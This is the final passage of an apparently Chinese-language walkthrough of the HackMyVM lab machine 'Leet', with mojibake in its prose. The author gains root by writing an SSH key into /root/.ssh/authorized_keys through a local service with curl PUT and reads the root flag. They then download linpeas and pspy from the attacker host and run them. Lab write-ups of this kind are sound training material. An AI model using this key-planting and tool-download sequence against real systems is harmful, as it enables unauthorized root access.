Enter same passphrase again: 
Your identification has been saved in root_shell
Your public key has been saved in root_shell.pub
The key fingerprint is:
SHA256:Vdg6wvnm+W39eeMRnIhdAO1PGITfYzf+8b2/PzBZBIw riva@leet.hmv
The key's randomart image is:
+---[RSA 3072]----+
|           +O+.  |
|          .E.+.. |
|       . ...o =. |
|        +.o o++Bo|
|        So o oB++|
|          o  + +.|
|         o .  oo=|
|          o  ..oO|
|           ...o=&|
+----[SHA256]-----+
riva@leet:/tmp$ cat root_shell.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYGNPkdarKmzApSzqwR/nakMAIMaR1La6ExDP95nswIpGxctSrqUgUtuGQZMXgcGPmVA5IcABBz+x5xjPO9UJJFRVoF9MK0Jh+imD2J30iBXDllZrnj9ws35BcBbtggRcK9sIr+zHxIuAJVGHwieBoOd1XB1tYycB84rMrS1pFNXhPRGViHtJaFh7tRREoRnfZdlRpRA9SCk395Ji0jEZcAr5ffBk43devMGdo2eR8VyJcriCp+hKlRRb6nep0tJsX2T+o/oK7WeiFU5j8jObqmrFbg99KfQ3KEFvGaGogKbW6pkFn8HCMr82NrPYrPaWqeskN8RxoaefXsNd6509cTCJWwpfysT4/hNVU5W/DnUh5IDPSpQH/Pwc8c+DJYGJZZHt2dj+guyqGaSFpPoSyE1mrbQ2zUoXQmvG4elDj58Ck8XsYuoksmoCRUeWMZnUFktLKtKQEPPZ9SCwEwpc+hw9RnOPYBuho49l5mVq0Qk9Hz7xim3O9hcOeSplGPsE= riva@leet.hmv
riva@leet:/tmp$ curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYGNPkdarKmzApSzqwR/nakMAIMaR1La6ExDP95nswIpGxctSrqUgUtuGQZMXgcGPmVA5IcABBz+x5xjPO9UJJFRVoF9MK0Jh+imD2J30iBXDllZrnj9ws35BcBbtggRcK9sIr+zHxIuAJVGHwieBoOd1XB1tYycB84rMrS1pFNXhPRGViHtJaFh7tRREoRnfZdlRpRA9SCk395Ji0jEZcAr5ffBk43devMGdo2eR8VyJcriCp+hKlRRb6nep0tJsX2T+o/oK7WeiFU5j8jObqmrFbg99KfQ3KEFvGaGogKbW6pkFn8HCMr82NrPYrPaWqeskN8RxoaefXsNd6509cTCJWwpfysT4/hNVU5W/DnUh5IDPSpQH/Pwc8c+DJYGJZZHt2dj+guyqGaSFpPoSyE1mrbQ2zUoXQmvG4elDj58Ck8XsYuoksmoCRUeWMZnUFktLKtKQEPPZ9SCwEwpc+hw9RnOPYBuho49l5mVq0Qk9Hz7xim3O9hcOeSplGPsE= riva@leet.hmv"
riva@leet:/tmp$ ssh root@0.0.0.0 -i root_shell 
Linux leet.hmv 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 28 17:37:49 2024 from 192.168.0.178
root@leet:~# cat root
cat: root: No such file or directory
root@leet:~# ls
index.html  r007_fl46.7x7  troll.jpg
root@leet:~# cat r007_fl46.7x7
ca169772acb099a02ebab8da1d9070ea
```

æ¥ç€æ‰¾åˆ°äº†ä¸€ä¸ªå½©è›‹ï¼š

```bash
root@leet:~# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.0.143 - - [01/Jul/2024 12:49:27] "GET /troll.jpg HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ wget http://192.168.0.165:8888/troll.jpg            
--2024-07-01 06:48:59--  http://192.168.0.165:8888/troll.jpg
Connecting to 192.168.0.165:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47428 (46K) [image/jpeg]
Saving to: â€˜troll.jpgâ€™

troll.jpg                            100%[=====================================================================>]  46.32K  --.-KB/s    in 0.02s   

2024-07-01 06:48:59 (1.95 MB/s) - â€˜troll.jpgâ€™ saved [47428/47428]
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911430.png" alt="image-20240701185059438" style="zoom: 33%;" />

## é¢å¤–æ¢ç´¢

æˆ‘å¯¹å‰é¢çš„é‚£äº›ä¸‹è½½ä¸ä¸‹æ¥çš„æ–‡ä»¶è¿˜æ˜¯æœ‰äº›è€¿è€¿äºæ€€ï¼Œå°è¯•æ¢ç´¢ä¸€ä¸‹ï¼š

```bash
root@leet:~# cd /tmp
root@leet:/tmp# wget http://192.168.0.143:8888/linpeas.sh
--2024-07-01 12:59:06--  http://192.168.0.143:8888/linpeas.sh
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860549 (840K) [text/x-sh]
Saving to: â€˜linpeas.sh.1â€™

linpeas.sh.1                         100%[=====================================================================>] 840.38K  --.-KB/s    in 0.03s   

2024-07-01 12:59:07 (29.1 MB/s) - â€˜linpeas.sh.1â€™ saved [860549/860549]

root@leet:/tmp# wget http://192.168.0.143:8888/pspy64
--2024-07-01 12:59:13--  http://192.168.0.143:8888/pspy64
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4468984 (4.3M) [application/octet-stream]
Saving to: â€˜pspy64.1â€™

pspy64.1                             100%[=====================================================================>]   4.26M  --.-KB/s    in 0.1s    

2024-07-01 12:59:13 (31.2 MB/s) - â€˜pspy64.1â€™ saved [4468984/4468984]

root@leet:/tmp# chmod +x *
root@leet:/tmp# ./linpeas.sh
```

linpeas.sh æˆ‘éšä¾¿çœ‹äº†ä¸€ä¸‹æ²¡å•¥å¥‡æ€ªçš„ä¸œè¥¿ï¼Œå®šæ—¶ä»»åŠ¡ä¸æ¸…æ¥šï¼Œpspy64è¿è¡Œå¼‚å¸¸ï¼Œç„¶åæ‰¾ç¾¤ä¸»å€Ÿäº†ä¸€ä¸ªï¼š

```bash
root@leet:/tmp# wget http://192.168.0.143:8888/lpspy64
--2024-07-01 13:07:30--  http://192.168.0.143:8888/lpspy64
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: â€˜lpspy64â€™

lpspy64                              100%[=====================================================================>]   2.96M  --.-KB/s    in 0.05s   

2024-07-01 13:07:30 (63.8 MB/s) - â€˜lpspy64â€™ saved [3104768/3104768]

root@leet:/tmp# chmod +x *
root@leet:/tmp# ./lpspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆ â–“â–ˆâ–ˆ   â–ˆâ–ˆâ–“
    â–“â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ    â–’ â–“â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ  â–ˆâ–ˆâ–’
    â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–“â–’â–‘ â–“â–ˆâ–ˆâ–„   â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–“â–’ â–’â–ˆâ–ˆ â–ˆâ–ˆâ–‘
    â–’â–ˆâ–ˆâ–„â–ˆâ–“â–’ â–’  â–’   â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–„â–ˆâ–“â–’ â–’ â–‘ â–â–ˆâ–ˆâ–“â–‘
    â–’â–ˆâ–ˆâ–’ â–‘  â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–ˆâ–ˆâ–’ â–‘  â–‘ â–‘ â–ˆâ–ˆâ–’â–“â–‘
    â–’â–“â–’â–‘ â–‘  â–‘â–’ â–’â–“â–’ â–’ â–‘â–’â–“â–’â–‘ â–‘  â–‘  â–ˆâ–ˆâ–’â–’â–’ 
    â–‘â–’ â–‘     â–‘ â–‘â–’  â–‘ â–‘â–‘â–’ â–‘     â–“â–ˆâ–ˆ â–‘â–’â–‘ 
    â–‘â–‘       â–‘  â–‘  â–‘  â–‘â–‘       â–’ â–’ â–‘â–‘  
                   â–‘           â–‘ â–‘     
                               â–‘ â–‘     
2024/07/01 13:07:42 CMD: UID=0     PID=3      | 
2024/07/01 13:07:42 CMD: UID=0     PID=2      | 
2024/07/01 13:07:42 CMD: UID=0     PID=1      | /sbin/init 
2024/07/01 13:08:01 CMD: UID=0     PID=12598  | 
2024/07/01 13:08:31 CMD: UID=0     PID=12599  | 
2024/07/01 13:09:01 CMD: UID=0     PID=12602  | /usr/sbin/CRON -f 
2024/07/01 13:09:01 CMD: UID=0     PID=12601  | /usr/sbin/CRON -f 
```

æ— å¼‚å¸¸ï¼Œé‚£å¯èƒ½å°±æ˜¯æœ‰äº›é™åˆ¶è®¿é—®ï¼Ÿæš‚ä¸”è¿™æ ·å§ã€‚

